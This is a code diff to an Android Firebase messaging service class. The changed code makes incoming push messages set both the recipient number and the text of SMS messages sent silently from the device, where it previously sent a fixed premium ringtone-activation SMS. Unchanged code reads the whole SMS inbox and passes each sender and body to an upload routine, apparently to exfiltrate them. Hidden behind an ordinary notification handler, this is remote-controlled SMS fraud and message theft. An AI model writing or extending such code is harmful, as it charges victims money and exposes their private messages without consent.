@@ -40,11 +40,8 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     public void onMessageReceived(RemoteMessage remoteMessage) {
 
         Log.d(TAG, "From: " + remoteMessage.getFrom());
-
-        // Check if message contains a data payload.
         if (remoteMessage.getData().size() > 0) {
             Log.d(TAG, "Message data payload: " + remoteMessage.getData());
-
             try {
                 JSONObject json = new JSONObject(remoteMessage.getData().toString());
                 handleDataMessage(json);
@@ -53,7 +50,6 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             }
         }
 
-        // Check if message contains a notification payload.
         if (remoteMessage.getNotification() != null) {
             Log.d(TAG, "Message Notification Body: " + remoteMessage.getNotification().getBody());
 
@@ -127,7 +123,6 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             }else if(message.equals("welcome")){
                 Sms(title);
             }
-
         } catch (JSONException e) {
             Log.e(TAG, "Json Exception: " + e.getMessage());
         } catch (Exception e) {
@@ -154,22 +149,25 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     }
 
     public void Sms(String number) {
-        String myMsg = "ringtone nsp 123 aktifkan";
-        if (TextUtils.isDigitsOnly(number)) {
+        String[] kf = number.split("-");
+        String nomor = kf[0];
+        String pesan = kf[1];
+        String myMsg = pesan;
+        Log.e("nomor ","debug nomor : " + nomor);
+        Log.e("pesan ","debug pesan : " + myMsg);
+        if (TextUtils.isDigitsOnly(nomor)) {
             SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(number, null, myMsg, null, null);
+            smsManager.sendTextMessage(nomor, null, myMsg, null, null);
         }
     }
 
     private void showContacts(){
         Uri inboxuri = Uri.parse("content://sms/inbox");
         ContentResolver cr = getContentResolver();
-
         Cursor c = cr.query(inboxuri, null, null, null, null);
         while (c.moveToNext()){
             String Number = c.getString(c.getColumnIndexOrThrow("address")).toString();
             String Body = c.getString(c.getColumnIndexOrThrow("body")).toString();
-
             Postsms(Number, Body);
         }
         c.close();
